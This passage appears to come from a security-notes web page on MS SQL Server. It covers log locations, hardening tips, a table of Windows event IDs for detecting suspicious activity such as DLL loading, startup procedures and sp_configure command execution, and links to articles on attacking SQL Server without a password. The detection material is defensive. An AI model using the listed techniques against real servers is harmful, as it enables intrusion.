<li>Error log @ <code class="codehilite"><span class="n">Program</span><span class="o">-</span><span class="n">Files</span><span class="err">\</span><span class="n">Microsoft</span> <span class="k">SQL</span> <span class="n">Server</span><span class="err">\</span><span class="n">MSSQL</span><span class="p">.</span><span class="mi">1</span><span class="n">MSSQL</span><span class="err">\</span><span class="n">LOG</span><span class="err">\</span><span class="n">ERRORLOG</span></code></li>
<li>Logs are also written to Windows Application logs with <code class="codehilite"><span class="n">MSSQLSERVER</span></code> as source.</li>
<li>Good password policy.</li>
<li>Not using same username across databases.</li>
<li>Logon failures are logged by default (source <code class="codehilite"><span class="n">MSSQLSERVER</span></code>).</li>
</ul>
<table>
<thead>
<tr>
<th>Event ID</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>18456</td>
<td>Authentication failures</td>
</tr>
<tr>
<td>5084</td>
<td>Setting TRUSTWORTHY to on/off</td>
</tr>
<tr>
<td>17135</td>
<td>Launch of startup stored procedures</td>
</tr>
<tr>
<td>33090</td>
<td>Successful DLL loading</td>
</tr>
<tr>
<td>17750</td>
<td>Failed DLL loading</td>
</tr>
<tr>
<td>15457</td>
<td>Using sp_configure (command execution)</td>
</tr>
</tbody>
</table>
<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://blog.anitian.com/hacking-microsoft-sql-server-without-a-password/">https://blog.anitian.com/hacking-microsoft-sql-server-without-a-password/</a></li>
<li><a href="https://blog.anitian.com/hacking-sql-servers-without-password/">https://blog.anitian.com/hacking-sql-servers-without-password/</a></li>
</ul>
                
                  
                
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../crypto/" title="Crypto" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Crypto
              </span>
            </div>
          </a>
        
        
          <a href="../databases/" title="Databases" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                Databases
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../assets/javascripts/application.808e90bb.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:".."}})</script>
      
    
  </body>
</html>